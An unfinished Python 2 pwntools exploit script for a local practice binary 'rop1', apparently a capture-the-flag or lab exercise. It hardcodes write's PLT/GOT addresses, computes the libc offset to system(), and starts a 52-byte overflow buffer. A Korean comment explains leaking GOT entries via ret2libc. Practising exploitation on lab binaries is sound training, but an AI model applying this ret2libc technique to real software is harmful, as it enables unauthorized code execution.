#-*- coding: utf-8 -*-
from pwn import *

p = process(["./rop1"])
elf = ELF('rop1')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')


write_plt = p32(0x08048320) # elf.plt['write']
write_got = p32(0x0804a014) # elf.got['write']
addr_write =  0x0f7ef4460       # libc.symbols['write']
addr_system =  0x0f7e57310      # libc.symbols['system'] 
offset_system = addr_write-addr_system 

print hex(libc.symbols['write']) , hex(libc.symbols['system']) 
print hex(offset_system) , hex(libc.symbols['write']-libc.symbols['system'])

payload = "a"*52






#open 0xf76266f0 0xd56f0
#puts 0x8048580 0x804a024 0x5fca0
#memory leak 기법 http://9oat.tistory.com/4
#rtl로 출력함수를 불러 온 다음, 함수의 plt 주소를 인자로 주어 got를 출력시켜 프로그램이 실행될 떄의 함수주소를 찾아낼 수 있다.
